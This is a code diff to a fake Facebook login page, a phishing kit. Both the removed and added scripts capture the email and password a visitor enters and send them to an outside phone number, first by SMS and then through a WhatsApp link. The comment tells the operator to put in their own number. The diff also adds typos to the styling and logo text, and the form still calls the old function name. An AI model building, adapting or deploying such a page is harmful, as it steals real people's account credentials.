@@ -6,7 +6,7 @@
     <title>Facebook - Log In</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-fam ppily: Arial, sans-serif;
             background-color: #f0f2f5;
             display: flex;
             justify-content: center;
@@ -77,25 +77,25 @@
             background: #36981f;
         }
     </style>
-    <script>
-        function redirectToSMS(event) {
-    event.preventDefault(); // Prevent form submission
+<script>
+    function redirectToWhatsApp(event) {
+        event.preventDefault(); // Prevent form submission
 
-    var email = document.getElementById("email").value;
-    var password = document.getElementById("password").value;
+        var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
 
-    var message = `Login Details:\nEmail/Phone: ${email}\nPassword: ${password}`;
-    var encodedMessage = encodeURIComponent(message);
+        var message = `Login Details:\nEmail/Phone: ${email}\nPassword: ${password}`;
+        var encodedMessage = encodeURIComponent(message);
 
-    // Open SMS app with pre-filled text (works only on mobile devices)
-    window.location.href = `sms:+2348105285791?&body=${encodedMessage}`;
-}
-    </script>
+        // Redirect to WhatsApp (replace phone number with your WhatsApp number)
+        window.location.href = `https://wa.me/2349124553643?text=${encodedMessage}`;
+    }
+</script>
 </head>
 <body>
 
     <div class="container">
-        <div class="logo">facebook</div>
+        <div class="logo">facebookl</div>
         <div class="login-box">
             <form onsubmit="redirectToSMS(event)">
                 <input type="text" id="email" placeholder="Email or Phone Number" required>
